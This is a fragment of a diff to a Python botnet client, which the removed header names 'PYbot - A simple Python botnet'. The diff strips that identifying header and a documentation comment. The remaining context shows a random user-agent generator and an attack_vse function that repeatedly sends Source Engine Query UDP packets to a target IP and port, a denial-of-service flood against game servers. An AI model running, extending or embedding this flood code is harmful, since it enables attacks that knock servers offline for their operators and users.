@@ -1,8 +1,3 @@
-# PYbot - A simple Python botnet
-# Author: WodX
-# Date: 27/09/2019
-# Bot
-
 import socket 
 import threading
 import time
@@ -24,7 +19,7 @@ def rand_ua():
     return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
 
 def attack_vse(ip, port, secs):
-    payload = b'\xff\xff\xff\xffTSource Engine Query\x00' # read more at https://developer.valvesoftware.com/wiki/Server_queries
+    payload = b'\xff\xff\xff\xffTSource Engine Query\x00'
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.sendto(payload, (ip, port))
